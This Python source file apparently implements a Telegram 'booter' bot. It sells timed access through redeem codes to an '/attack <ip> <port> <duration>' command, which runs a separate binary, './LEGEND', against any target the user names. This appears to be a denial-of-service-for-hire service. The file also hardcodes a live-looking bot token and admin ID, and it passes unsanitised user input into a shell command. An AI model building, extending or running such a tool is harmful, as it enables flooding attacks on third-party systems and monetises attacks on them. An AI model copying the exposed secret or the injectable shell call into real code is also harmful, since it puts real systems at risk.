import os
import asyncio
import random
import string
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext

# Load the bot token from environment variables for security
TELEGRAM_BOT_TOKEN = '7841774667:AAF89OHjLZTaI8vnwOYGGRTX5LCZGfJXhD4'  # Replace with your actual token
ADMIN_ID = '1866961136'  # Replace with your admin user ID as a string
bot_access_free = False 

# Store attacked IPs
attacked_ips = set()

# User access mapping
user_access = {}
# Code mappings for access
redeem_codes = {}

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    help_message = (
        "*🔧 Help - Available Commands:* \n\n"
        "*1. /start* - Welcome message and instructions on how to use the bot.\n"
        "*2. /redeem <duration>* - Admin command to generate a redeem code for the specified duration (1, 5, 7, or 30 days).\n"
        "*3. /redeem_code <code>* - Redeem your access using the generated code.\n"
        "*4. /attack <ip> <port> <duration>* - Launch an attack on the specified IP, port, and duration (in seconds).\n"
        "*5. /help* - Show this help message with a list of available commands.\n"
    )
    
    await context.bot.send_message(chat_id=chat_id, text=help_message, parse_mode='Markdown')

async def generate_redeem_code(user_name):
    """Generates a unique redeem code for the user."""
    code_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
    code = f"{user_name}-{code_suffix}"
    return code

async def redeem_access(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    # Check if the message sender is the admin
    if user_id != ADMIN_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to generate codes!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <duration>* \n*Available durations: 1, 5, 7, 30*", parse_mode='Markdown')
        return

    duration = context.args[0]
    duration_mapping = {
        '1': timedelta(days=1),
        '5': timedelta(days=5),
        '7': timedelta(days=7),
        '30': timedelta(days=30)
    }

    if duration not in duration_mapping:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid duration! Use 1, 5, 7, or 30 days.*", parse_mode='Markdown')
        return

    # Generate a unique redeem code
    user_name = update.effective_user.username if update.effective_user.username else "User"
    code = await generate_redeem_code(user_name)

    # Store the valid redeem code with its expiration
    expiry_time = datetime.now() + duration_mapping[duration]
    redeem_codes[code] = expiry_time

    # Create a user-friendly message escaping special characters
    escaped_code = code.replace("_", "\\_").replace("*", "\\*").replace("[", "\\[").replace("`", "\\`")

    message = (
        "*✅ Redemption code generated!*\n"
        f"*Code:* `{escaped_code}`\n"
        f"*Access Duration:* {duration} days\n"
        "*To redeem, use: `/redeem_code <your_code>`*"
    )

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def redeem_code(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem_code <code>*", parse_mode='Markdown')
        return

    code = context.args[0]

    if code not in redeem_codes:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid or expired code!*", parse_mode='Markdown')
        return

    # Assign access to the user and clean up the code
    expiry_time = redeem_codes.pop(code)
    user_access[user_id] = expiry_time
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Code redeemed successfully!*\n*Your access expires on: {expiry_time}*", parse_mode='Markdown')

async def has_access(user_id):
    """Check if the user has valid access."""
    current_time = datetime.now()
    return user_access.get(user_id, datetime.min) > current_time

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./LEGEND {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if not await has_access(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Your access has expired or you do not have access. Please redeem a new code with /redeem_code <code>.*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    ip, port, duration = args

    if ip in attacked_ips:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ This IP ({ip}) has already been attacked!*\n*Try another target.*", parse_mode='Markdown')
        return

    attacked_ips.add(ip)

    await context.bot.send_message(chat_id=chat_id, text=( 
        f"*⚔️ Attack Launched! ⚔️*\n"
        f"*🎯 Target: {ip}:{port}*\n"
        f"*🕒 Duration: {duration} seconds*\n"
        f"*🔥 Let the battlefield ignite! 💥*"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))  # Help command
    application.add_handler(CommandHandler("redeem", redeem_access))  # Admin redeem command
    application.add_handler(CommandHandler("redeem_code", redeem_code))  # User redeem command
    application.add_handler(CommandHandler("attack", attack))

    application.run_polling()

if __name__ == '__main__':
    main()